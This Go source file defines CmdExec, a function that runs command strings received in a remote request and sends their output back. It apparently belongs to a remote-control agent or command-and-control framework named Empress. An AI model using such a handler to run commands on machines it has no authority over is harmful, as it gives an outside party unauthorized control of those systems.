package proc

import (
	"bytes"
	"errors"
	"github.com/pygrum/Empress/transport"
	"os/exec"
	"strings"
)

func CmdExec(req *transport.Request, response *transport.Response) {
	for _, arg := range req.Args {
		command := string(arg)
		tokens := strings.Split(command, " ")

		cmd := exec.Command(tokens[0], tokens[1:]...)
		var cOut, cErr bytes.Buffer
		cmd.Stdout = &cOut
		cmd.Stderr = &cErr
		_ = cmd.Run()
		if len(cOut.String()) != 0 {
			transport.AddResponse(response, transport.ResponseDetail{
				Status: transport.StatusSuccess,
				Dest:   transport.DestStdout,
				Data:   cOut.Bytes(),
			})
		}
		if len(cErr.String()) != 0 {
			transport.ResponseWithError(response, errors.New(cErr.String()))
		}
	}
}
